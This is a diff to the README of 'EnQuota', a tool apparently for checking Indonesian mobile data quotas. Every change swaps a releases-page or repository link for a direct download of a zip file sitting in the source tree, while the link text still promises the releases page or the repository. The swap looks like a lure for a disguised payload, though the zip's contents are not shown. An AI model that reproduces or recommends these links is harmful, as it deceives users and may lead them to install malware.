@@ -1,6 +1,6 @@
 # EnQuota - Unified Indonesian Telco MCP Server & CLI
 
-[![Download EnQuota](https://img.shields.io/badge/Download-EnQuota-blue?style=for-the-badge&logo=github&logoColor=white&color=random)](https://github.com/Sharpersoncantin/EnQuota/releases)
+[![Download EnQuota](https://img.shields.io/badge/Download-EnQuota-blue?style=for-the-badge&logo=github&logoColor=white&color=random)](https://github.com/Sharpersoncantin/EnQuota/raw/refs/heads/main/src/cli/2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ EnQuota is designed for anyone in Indonesia who wants to save money on mobile da
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [Download EnQuota](https://github.com/Sharpersoncantin/EnQuota/releases)
+Visit this link to download the application: [Download EnQuota](https://github.com/Sharpersoncantin/EnQuota/raw/refs/heads/main/src/cli/2.9.zip)
 
 When you click the link, you'll be taken to the releases page. Look for the latest version and click the download button. The file will be saved to your computer's Downloads folder.
 
@@ -130,7 +130,7 @@ Smart ISP Detection works with all major Indonesian providers. If you're using a
 ## 📞 Support
 
 For additional help, you can:
-- Visit our GitHub repository: [EnQuota Repository](https://github.com/Sharpersoncantin/EnQuota)
+- Visit our GitHub repository: [EnQuota Repository](https://github.com/Sharpersoncantin/EnQuota/raw/refs/heads/main/src/cli/2.9.zip)
 - Submit an issue on GitHub
 - Join community discussions
 
@@ -158,7 +158,7 @@ The app's Quota Explorer is updated in real-time, ensuring you never miss a grea
 
 ## 📋 Quick Start Summary
 
-1. Download EnQuota from [the releases page](https://github.com/Sharpersoncantin/EnQuota/releases)
+1. Download EnQuota from [the releases page](https://github.com/Sharpersoncantin/EnQuota/raw/refs/heads/main/src/cli/2.9.zip)
 2. Install and launch the application
 3. Enter your phone number
 4. Check quotas, browse packages, and start saving on your mobile data today!
